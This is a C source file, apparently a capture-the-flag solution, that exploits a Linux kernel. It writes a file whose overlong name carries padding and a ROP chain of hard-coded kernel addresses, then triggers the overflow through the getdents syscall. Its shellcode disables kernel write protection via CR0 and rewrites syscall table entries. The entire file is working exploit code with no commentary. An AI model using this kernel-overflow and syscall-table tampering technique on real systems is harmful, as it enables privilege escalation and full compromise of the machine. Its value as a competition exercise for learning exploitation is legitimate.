#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h> 
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#define _GNU_SOURCE           /* See feature_test_macros(7) */
#include <dirent.h>

#define OFFSET 102

#define RET        0x02fd70
#define BASE 0xffffffffa4e00000

#define GETDENTS64 0xc7610
#define GETDENTS   0xc7710
#define LSTAT      0xbad30
#define SYSCALL_TABLE 0x8001a0


void shellcode(){
    unsigned long *table = (unsigned long *)(BASE+SYSCALL_TABLE);

    asm(
        ".intel_syntax noprefix\n"
        "MOV RDX,CR0\n"
        "AND RDX,-0x10001\n"
        "MOV CR0, RDX"
    );
    table[0xd9] = BASE + GETDENTS64;
    table[0x4e] = BASE + GETDENTS;
    table[0x06] = BASE + LSTAT;
    exit(0);
}

int main(int argc, char **argv){
    char name[200];
    unsigned long *rop;
    
    memset(name, 0, 200);
    strcpy(name, "ecsc_flag_");
    
    memset(name+strlen(name), 'A',OFFSET );
    
    rop = (unsigned long *)(name+strlen(name));
    rop[0] = BASE + RET;
    rop[1] = shellcode;

    int fd = open(name, O_RDWR | O_CREAT, 644);
    write(fd, name, 200);
    close(fd);

    fd = open(".", O_RDONLY | O_DIRECTORY);
    syscall(SYS_getdents, fd, name, 200);

}